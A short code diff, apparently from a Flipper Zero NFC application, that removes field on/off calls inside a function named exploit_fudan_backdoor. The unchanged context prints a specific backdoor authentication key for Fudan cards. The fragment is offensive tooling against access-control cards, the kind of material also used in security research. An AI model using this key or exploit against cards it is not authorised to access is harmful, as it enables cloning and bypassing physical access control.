@@ -61,9 +61,6 @@ void exploit_fudan_backdoor(FudanApp* app) {
         furi_mutex_release(app->mutex);
         furi_delay_ms(300);
 
-        furi_hal_nfc_field_on();
-        furi_delay_ms(500);
-
         furi_mutex_acquire(app->mutex, FuriWaitForever);
         snprintf(app->status_text, sizeof(app->status_text), "Sending backdoor key:\nA3 96 EF A4 E2 4F");
         furi_mutex_release(app->mutex);
@@ -102,7 +99,6 @@ void exploit_fudan_backdoor(FudanApp* app) {
         storage_file_free(file);
         furi_record_close(RECORD_STORAGE);
 
-        furi_hal_nfc_field_off();
         furi_hal_nfc_release();
     } else {
         furi_mutex_acquire(app->mutex, FuriWaitForever);
